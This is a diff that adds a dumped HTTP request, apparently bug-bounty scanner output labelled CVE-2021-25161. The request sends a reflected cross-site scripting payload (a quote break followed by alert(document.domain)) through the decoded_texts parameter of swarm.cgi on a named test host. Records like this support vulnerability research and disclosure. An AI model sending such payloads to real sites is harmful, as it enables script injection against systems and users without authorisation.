@@ -1,0 +1,11 @@
+[CVE-2021-25161] Dumped HTTP request for http://test.whitelabel.bitpanda.com/swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27
+
+
+GET /swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27 HTTP/1.1
+Host: test.whitelabel.bitpanda.com
+User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
